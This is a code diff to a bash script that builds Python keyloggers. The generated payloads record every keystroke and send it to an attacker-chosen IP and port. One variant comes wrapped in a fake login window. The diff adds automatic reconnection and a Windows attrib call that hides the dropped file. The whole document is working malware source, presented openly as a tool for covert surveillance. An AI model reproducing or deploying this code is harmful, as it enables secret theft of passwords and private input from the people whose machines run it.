@@ -17,7 +17,6 @@ ascii_art() {
 EOF
 }
 
-
 validate_ip() {
     local ip="$1"
     if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
@@ -33,7 +32,6 @@ validate_ip() {
     fi
 }
 
-
 validate_port() {
     local port="$1"
     if [[ "$port" =~ ^[0-9]+$ ]] && (( port >= 1 && port <= 65535 )); then
@@ -43,59 +41,83 @@ validate_port() {
     fi
 }
 
+check_root() {
+    if [ "$(id -u)" -ne 0 ]; then
+        echo "This script must be run as root. Please use 'sudo' to execute the script."
+        exit 1
+    fi
+}
 
 ascii_art
 
+check_root
 
 echo "Select the type of application:"
 echo "1. Silent Keylogger"
 echo "2. Keylogger with Login Application"
 read -p "Enter 1 or 2: " app_type
 
-
-read -p "Enter the local IP address: " ip_address
+read -p "Enter the server IP address: " ip_address
 read -p "Enter the port: " port
 read -p "Enter the output file name (e.g., target.py): " output_file
-
 
 if ! validate_ip "$ip_address"; then
     echo "Invalid IP address format."
     exit 1
 fi
 
-
 if ! validate_port "$port"; then
     echo "Invalid port number. Port must be between 1 and 65535."
     exit 1
 fi
 
-
-case "$app_type" in
-    1)
-
-        cat <<EOF > "$output_file" 
+# Python code template for both applications
+python_code_template() {
+    cat <<EOF
 import threading
 import socket
+import subprocess
+import time
 from pynput import keyboard
 
 SERVER_IP = "$ip_address"
 SERVER_PORT = $port
+RETRY_INTERVAL = 5  # Time in seconds between connection attempts
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((SERVER_IP, SERVER_PORT))
+def execute_attrib_command():
+    try:
+        subprocess.run(['attrib', '+s', '+h', '$output_file'], check=True)
+        print("Attrib command executed successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while executing attrib command: {e}")
+
+def connect_to_server():
+    while True:
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((SERVER_IP, SERVER_PORT))
+            print("Successfully connected to the server.")
+            return client_socket
+        except (socket.error, ConnectionRefusedError) as e:
+            print(f"Connection failed: {e}. Retrying in {RETRY_INTERVAL} seconds...")
+            time.sleep(RETRY_INTERVAL)
 
 def on_press(key):
-    if key == keyboard.Key.space:
-        client_socket.sendall(b" ")
-    elif key == keyboard.Key.backspace:
-        client_socket.sendall(b"[BACKSPACE]")
-    elif key == keyboard.Key.enter:
-        client_socket.sendall(b"\\n")
-    else:
-        try:
-            client_socket.sendall(f"{key.char}".encode('utf-8'))
-        except AttributeError:
-            client_socket.sendall(f"[{key}]".encode('utf-8'))
+    try:
+        if key == keyboard.Key.space:
+            client_socket.sendall(b" ")
+        elif key == keyboard.Key.backspace:
+            client_socket.sendall(b"[BACKSPACE]")
+        elif key == keyboard.Key.enter:
+            client_socket.sendall(b"\\n")
+        else:
+            try:
+                client_socket.sendall(f"{key.char}".encode('utf-8'))
+            except AttributeError:
+                client_socket.sendall(f"[{key}]".encode('utf-8'))
+    except (socket.error, ConnectionAbortedError) as e:
+        print(f"Error while sending data: {e}")
+        reconnect()
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -106,23 +128,47 @@ def start_listeners():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
         key_listener.join()
 
+def reconnect():
+    global client_socket
+    print("Attempting to reconnect...")
+    client_socket.close()
+    client_socket = connect_to_server()
+
+# Execute the attrib command to hide the script
+execute_attrib_command()
+
+client_socket = connect_to_server()
+
 listener_thread = threading.Thread(target=start_listeners, daemon=True)
 listener_thread.start()
-
 listener_thread.join()
 EOF
+}
+
+case "$app_type" in
+    1)
+        python_code_template > "$output_file"
         ;;
     2)
-
         cat <<EOF > "$output_file"
 import tkinter as tk
 from tkinter import messagebox
 from pynput import keyboard
 import threading
 import socket
+import subprocess
+import time
 
 SERVER_IP = "$ip_address"
 SERVER_PORT = $port
+RETRY_INTERVAL = 5  # Time in seconds between connection attempts
+
+def execute_attrib_command():
+    try:
+        subprocess.run(['attrib', '+s', '+h', '$output_file'], check=True)
+        print("Attrib command executed successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"An error occurred while executing attrib command: {e}")
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client_socket.connect((SERVER_IP, SERVER_PORT))
@@ -148,6 +194,12 @@ def on_release(key):
 def start_listeners():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener:
         key_listener.join()
+
+def reconnect():
+    global client_socket
+    print("Attempting to reconnect...")
+    client_socket.close()
+    client_socket = connect_to_server()
 
 def login():
     username = username_entry.get()
@@ -162,6 +214,9 @@ root.geometry("1280x720")
 
 frame = tk.Frame(root, bg="black")
 frame.place(relwidth=1, relheight=1)
+
+header_label = tk.Label(frame, text="Created by ZA0infinity", font=("Arial", 18, "bold"), bg="black", fg="white")
+header_label.pack(pady=10)
 
 title_label = tk.Label(frame, text="Login Application", font=("Arial", 24, "bold"), bg="red")
 title_label.pack(pady=20)
